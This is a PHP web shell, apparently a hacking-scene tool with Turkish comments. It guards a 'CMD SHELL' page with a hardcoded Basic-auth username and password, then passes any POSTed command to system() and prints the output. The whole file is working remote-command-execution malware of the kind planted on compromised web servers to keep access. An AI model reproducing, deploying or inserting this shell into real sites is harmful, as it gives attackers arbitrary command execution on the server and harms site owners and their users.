<?php 
$kul[0]['username']="mefisto"; 
$kul[0]['password']="şifre"; 



//Üstteki Kullanıcı adı ve sifreyi cogaltabilirsiniz

// Dogrulama 

function authenticate() 
{ 
header( 'WWW-Authenticate: Basic realm="LOGİN | Sistem Yetkili Girisi"' ); 
header( 'HTTP/1.0 401 Unauthorized' ); 
echo '<br><br><br><body bgcolor=silver><b><font color=red size=2 face="Tahoma"><center>GiRiS YAPILMADI .. <a href="hasyer.php"><font color=darkgreen size=2 face="Tahoma">Geri Gelip Tekrar Giris icin TIKLAYIN</font></a></b> '; 
exit; 
} 

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) { authenticate(); } else 
{ 
for($i=0;$i<count($kul);$i++) { if($_SERVER['PHP_AUTH_USER']==$kul[$i]['username'] && $_SERVER['PHP_AUTH_PW']==$kul[$i]['password']){$auth=TRUE;}} 
if($auth !=TRUE) {authenticate();} 
} 
?>
<pre>
<html><head>
<title>CMD SHELL</title>
<meta content="text/html; charset=utf-8">
<meta name="author" content="Crixu" />
<link rel="SHORTCUT ICON" href="http://us.yimg.com/i/mesg/emoticons7/61.gif">
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="http://faisalahmed.me/wp-content/assets/css/1.css">
</head><body>
<pre>
<form method=post>
   Command <input name=cmd value=<?php $_POST['cmd'];?> >
</form>
<?php
if(isset($_POST['cmd']) && $_POST['cmd']!=''){
   system($_POST['cmd'].' 2>&1');
}
?>
</pre>
</body>
</html>
